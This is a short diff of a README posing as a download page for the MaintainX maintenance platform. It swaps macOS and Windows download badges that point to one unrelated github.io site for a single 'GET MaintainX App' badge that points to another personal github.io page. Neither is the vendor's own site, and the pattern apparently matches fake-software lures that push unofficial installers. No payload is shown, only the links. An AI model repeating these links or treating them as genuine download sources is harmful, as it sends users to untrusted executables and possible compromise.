@@ -1,18 +1,7 @@
 # MaintainX Download — Maintenance Platform
 
-<a href="https://io-app-git.github.io/.github/?offer=MaintainX" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/MaintainX%20for%20macOS-000000?style=for-the-badge&logo=apple&logoColor=white" 
-    width="280" 
-    alt="MaintainX for macOS">
-</a>
+[![GET MaintainX App](https://img.shields.io/badge/GET%20%E2%80%94%20MaintainX-App-0078D6?style=for-the-badge&logoColor=white)](https://karenwilsond350.github.io/.github/MaintainX-App)
 
-<a href="https://io-app-git.github.io/.github/?offer=MaintainX" target="_blank">
-  <img 
-    src="https://img.shields.io/badge/MaintainX%20for%20Windows-0078D7?style=for-the-badge&logo=windows&logoColor=white" 
-    width="280" 
-    alt="MaintainX for Windows">
-</a>
 
 ---
 
